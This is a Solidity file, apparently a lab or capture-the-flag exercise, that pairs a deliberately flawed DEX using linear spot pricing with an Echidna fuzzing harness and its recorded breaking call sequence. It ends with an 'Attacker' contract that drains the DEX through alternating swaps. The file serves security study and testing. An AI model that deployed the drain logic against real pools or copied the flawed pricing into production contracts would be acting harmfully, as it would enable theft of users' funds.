// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @notice DEX
 */
contract Dex is Ownable {
    address public token1;
    address public token2;

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address tokenAddress, uint256 amount) public onlyOwner {
        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

/**
 * @notice SwappableToken
 */
contract SwappableToken is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    )
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

/**
 * @notice Test contract for Invariant testing with echidna
 */
contract TestDex is Dex {
    address echidna = msg.sender;

    /**
     * set this up so that Dex has 100 tokens of each and echidna EOA has 10 tokens of each
     */
    constructor() Dex() {
        token1 = address(new SwappableToken(address(this), "token 1", "token1", 110));
        token2 = address(new SwappableToken(address(this), "token 2", "token2", 110));
        // transfer 10 tokens to echidna
        IERC20(token1).transfer(echidna, 10);
        IERC20(token2).transfer(echidna, 10);
        // renounce ownership of DEX
        renounceOwnership();
        // approve dex to spend tokens by echidna
        approve(address(this), type(uint256).max);
    }

    /**
     * @dev function to prevent echidna from fuzzing swap  with random token addresses
     * @param amount amount to fuzz. amount % userBalance will ensure that amount is within limits
     * @param tradeToken1WithToken2 bool to decide the side of the trade
     */
    function swap(uint amount, bool tradeToken1WithToken2) public {
        if (tradeToken1WithToken2) {
            uint token1Balance = balanceOf(token1, echidna);
            // filter amount to stay within echidna balance: [1, user_balance]
            amount = 1 + amount % token1Balance;
            swap(token1, token2, amount);
        } else {
            uint token2Balance = balanceOf(token2, echidna);
            // filter amount to stay within echidna balance: [1, user_balance]
            amount = 1 + amount % token2Balance;
            swap(token2, token1, amount);
        }
    }

    /**
     *                              FINDINGS FROM FUZZER                                                              █│
    │ Call sequence:                                                                                                   │
        │ 1.swap(99,true) Time delay: 303345 seconds Block delay: 4462                                                 │
        │ 2.swap(6980250406452204338,false) Time delay: 448552 seconds Block delay: 2511                               │
        │ 3.swap(115792089237316195423570985008687907853269984665640564039457584007913129639927,true) Time delay: 4198 │
        │ 4.swap(115792089237316195423570985008687907853269984665640564039457584007913129639827,false) Time delay: 679 │
        │ 5.swap(60,true) Time delay: 569114 seconds Block delay: 23275                                                │
        │ 6.swap(115792089237316195423570985008687907853269984665640564039457584007913129639827,false) Time delay: 292 │
     */
    function echidna_token1_high_dex_balance() public view returns (bool) {
        return balanceOf(token1, address(this)) > 60;
    }

    function echidna_token2_high_dex_balance() public view returns (bool) {
        return balanceOf(token2, address(this)) > 60;
    }

    function echidna_accurate_swap_price() public view returns (bool) {
        uint256 from = balanceOf(token1, address(this));
        uint256 to = balanceOf(token2, address(this));
        uint256 amount = 100;
        uint calculatedSwapPrice = (amount * to) / from;
        return getSwapPrice(token1, token2, amount) == calculatedSwapPrice;
    }

    function echidna_token1_userbalance_below_dex() public view returns (bool) {
        return balanceOf(token1, echidna) < balanceOf(token1, address(this));
    }

    function echidna_token2_userbalance_below_dex() public view returns (bool) {
        return balanceOf(token2, echidna) < balanceOf(token2, address(this));
    }
}

/**
 * @notice Attacker contract that can drain Dex
 */
contract Attacker {
    address private token1;
    address private token2;
    Dex private dex;

    constructor(Dex dex_, IERC20 token1_, IERC20 token2_) {
        dex = dex_;
        token1 = address(token1_);
        token2 = address(token2_);
    }

    /**
     * @dev since DEX uses a linear pricing model, we can make alternate sequence of
     * swaps to drain it completely
     * @param amount token balance of EOA
     */
    function attack(uint256 amount) external {
        // transfer tokens from EOA to this contract and give allowance
        IERC20(token1).transferFrom(msg.sender, address(this), amount);
        IERC20(token2).transferFrom(msg.sender, address(this), amount);
        dex.approve(address(dex), type(uint256).max);

        // bool to exit the `while` loop
        bool exitLoop;
        while (!exitLoop) {
            // trade token1 with token2
            exitLoop = _swap(token1, token2);
            if (exitLoop) break;

            // trade token2 with token1
            exitLoop = _swap(token2, token1);
        }

        // transfer tokens back to EOA
        IERC20(token1).transfer(msg.sender, dex.balanceOf(token1, address(this)));
        IERC20(token2).transfer(msg.sender, dex.balanceOf(token2, address(this)));
    }

    /**
     * @param tokenIn address of token to send
     * @param tokenOut address of token to receive
     * @return exitLoop bool to break the while loop
     */
    function _swap(address tokenIn, address tokenOut) private returns (bool exitLoop) {
        // tokenIn holding of this contract
        uint256 amountIn = dex.balanceOf(tokenIn, address(this));

        // tokenOut and tokenIn holdings of dex
        uint256 tokenOutLiq = dex.balanceOf(tokenOut, address(dex));
        uint256 tokenInLiq = dex.balanceOf(tokenIn, address(dex));

        // expected tokenOut amount to receive
        uint256 amountOut = dex.getSwapPrice(tokenIn, tokenOut, amountIn);

        /**
         * if tokenOut balance of Dex is more than expected amount of tokenOut
         * that we would receive, do the swap
         * else send amount of tokenIn = tokenIn liquidity in Dex. This swap should
         * drain the Dex from tokenOut
         */
        if (amountOut < tokenOutLiq) {
            dex.swap(tokenIn, tokenOut, amountIn);
            return false;
        } else {
            dex.swap(tokenIn, tokenOut, tokenInLiq);
            // since now liquidity is less we can break the loop
            return true;
        }
    }
}
